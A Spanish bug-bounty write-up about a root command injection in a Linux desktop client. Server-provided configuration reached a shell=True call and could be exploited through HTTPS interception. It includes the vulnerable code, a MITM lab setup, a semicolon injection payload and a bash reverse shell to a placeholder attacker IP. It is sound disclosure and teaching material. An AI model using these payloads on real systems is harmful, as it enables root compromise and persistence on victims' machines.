---
title:       "Inyección de comandos como root por MITM: el servidor escribe tu línea de comandos"
summary:     "Una herramienta de consola que se ejecuta con sudo descargaba su configuración del servidor y la pegaba, tal cual, dentro de una llamada a la shell. Un punto y coma en el sitio correcto y el atacante es root. Reporte aceptado y recompensado."
date:        2026-10-29 21:10:00 +0100
lang:        es
ref:         rce-cli-shell-true
image:       /assets/img/og/rce-cli-shell-true-es.png

severity:    high
cvss:        "8.0"
cvss_vector: "CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
cwe:         "CWE-78 · CWE-88"
vuln_class:  "Inyección"
target_type: "Cliente de escritorio (Linux)"
platform:    "YesWeHack"
status:      "Corregido"
reward:      "Recompensado"
tags:        [rce, linux, shell, mitm, root, inyeccion-de-comandos, python]

takeaways:
  - "`shell=True` convierte una cadena en un programa. Si parte de esa cadena viene de la red, el servidor escribe tu línea de comandos."
  - "«Es que el atacante necesita un MITM» no es una excusa: si el programa lo contempla en su alcance, es una precondición, no una barrera."
  - "Cuando un cliente acepta **opciones** de un servidor, hace falta una lista blanca. Filtrar caracteres raros siempre se queda corto."
  - "El propio mensaje de error del programa me enseñó el comando que había construido. Leer los errores despacio vale más que muchos payloads."
---

Una herramienta de línea de comandos para Linux, parte de una aplicación de escritorio, que
se ejecuta con `sudo` porque tiene que tocar la configuración de red. Cuando le pides que
conecte: pide los parámetros al servidor del fabricante, construye con ellos una orden, y
la ejecuta. El fallo está entero en ese salto.

## La línea

```python
# libs/helpers.py
def execute_command(cmd):
    proceso = subprocess.Popen(cmd, shell=True)
```

`shell=True` cambia el significado de todo. Sin shell le pasas una lista y el punto y coma
es un carácter más del argumento. Con shell le pasas una frase que interpreta `/bin/sh`, y
ahí el punto y coma significa «aquí acaba un comando y empieza otro».

```python
objetivo = "8.8.8.8; touch /tmp/me-han-colado"

subprocess.run(["ping", "-c1", objetivo])            # ping falla, no se crea nada
subprocess.run(f"ping -c1 {objetivo}", shell=True)   # el fichero aparece
```

<figure>
  <img src="{{ '/assets/img/writeups/rce-cli-shell-true/04-shell-true.svg' | relative_url }}"
       alt="Diagrama: a la izquierda una lista de argumentos, donde el punto y coma es un carácter más; a la derecha una cadena con shell=True, donde la shell lo interpreta como separador de órdenes">
  <figcaption>La misma orden por los dos caminos. A la izquierda los datos siguen siendo datos; a la derecha se han vuelto código.</figcaption>
</figure>

## Qué metía dentro de la cadena

```python
respuesta = requests.get(f"https://api.ejemplo.tld/v2/my/servers/{server_id}/configs")
bloque    = respuesta.json()["clientdata"]

parametros = parse_config(bloque)       # parte por líneas y espacios, sin filtrar

cmd = "sudo {} {} {}".format(binario, " ".join(parametros), filtros)
execute_command(cmd)                    # <- shell=True
```

No comprueba qué opciones son válidas ni si los valores llevan caracteres peligrosos. El
servidor tiene permiso de escritura sobre tu línea de comandos.

## «Pero para eso hay que ser el servidor»

Hay que estar en medio de la conexión HTTPS, sí. Y eso ocurre más de lo que parece: wifis
públicas con certificado raíz preinstalado, portátiles de empresa con un certificado
corporativo para inspeccionar tráfico, una CA intermedia comprometida, un insider en el
proveedor de red.

Y lo decisivo: el propio programa de bug bounty lo incluía en su alcance, en la categoría
*«ejecución de código arbitrario mediante ataques MITM»*. Si el programa lo contempla, no
es una excusa para no reportar: es una precondición declarada.

<div class="note" markdown="1">
Antes de descartar un fallo por «necesita una condición rara», lee el alcance. Muchos
programas listan explícitamente qué precondiciones aceptan.
</div>

Lo que lo convierte en fallo del producto: el cliente no comprobaba qué certificado estaba
aceptando más allá de la validación normal del sistema. Otra parte del mismo producto sí lo
hacía —tenía fijado el certificado esperado—, pero esta no. Esa incoherencia fue media
mitad del reporte.

## El laboratorio

Una máquina virtual desechable, haciendo los dos papeles.

```bash
# 1 · una CA propia, confiada en el sistema
openssl req -x509 -newkey rsa:4096 -nodes -days 1 \
        -keyout ca.key -out ca.crt -subj "/CN=LAB-CA"
sudo cp ca.crt /usr/local/share/ca-certificates/lab.crt && sudo update-ca-certificates

# 2 · un certificado para el dominio del fabricante, firmado por ella
# 3 · el dominio apuntando a mi máquina
echo "127.0.0.1  api.ejemplo.tld" | sudo tee -a /etc/hosts

# 4 · un proxy que reenvía todo al servidor real menos la configuración
```

El login funciona, la lista de servidores funciona, todo normal. Solo intercepto la
petición que trae la configuración.

<figure>
  <img src="{{ '/assets/img/writeups/rce-cli-shell-true/05-mitm.svg' | relative_url }}"
       alt="Diagrama del montaje: el cliente de la víctima habla con el proxy del atacante, que reenvía todas las peticiones al servidor real salvo la de configuración, cuya respuesta sustituye">
  <figcaption>Tres de las cuatro peticiones pasan intactas. Solo se sustituye la respuesta que importa.</figcaption>
</figure>

## El payload

```
cipher aes-256-gcm; id > /tmp/pwn; touch /tmp/marcador; #
```

| Pieza | Para qué sirve |
|---|---|
| `cipher aes-256-gcm` | Parece una opción legítima; quien mire por encima no ve nada raro |
| `; id > /tmp/pwn; touch /tmp/marcador` | Los puntos y coma cierran el comando anterior y abren los míos |
| `#` | Comenta lo que el programa añada después |

Es lo mismo que una inyección SQL, pero la base de datos es tu sistema operativo.

## El disparo

La víctima escribe el comando documentado del producto. Y pasó algo que mejoró el reporte:
el binario murió porque la almohadilla le dejó la orden a medias, y al morir **el programa
imprimió la frase completa que había intentado ejecutar, con mi payload dentro**. El fallo
del programa es la prueba del fallo del programa.

Los comandos ya se habían ejecutado antes: la shell interpreta de izquierda a derecha. El
fichero lo creó `uid=0`. Y como no se levantó ninguna conexión, el usuario solo vio un
error y volvió a intentarlo, disparando el payload otra vez.

## De «ejecuto comandos» a «estoy dentro»

Un marcador en `/tmp` demuestra el mecanismo pero no cuánto duele. Cambié el payload por
una shell inversa:

```
cipher aes-256-gcm; bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1' & id > /tmp/pwn; #
```

A partir de ahí escribo en mi terminal y los comandos se ejecutan en su máquina, como root.
Ese salto es lo que convierte un *Medium* en un *High*.

## Impacto

<div class="impact" markdown="1">
**Impacto.** Ejecución de comandos como **root** en cualquier máquina Linux con el cliente
instalado, con la víctima haciendo exactamente una acción: el comando que el propio
producto documenta. El código del atacante corre **antes** de que se establezca la
conexión, así que puede instalar persistencia (`authorized_keys`, una tarea programada, un
servicio del sistema) en milisegundos. Cambiar la contraseña de la cuenta no sirve de
nada: el atacante ya no está en la cuenta, está en la máquina. La única limpieza fiable es
reinstalar el sistema operativo, y la víctima no tiene ningún motivo para sospecharlo.
</div>
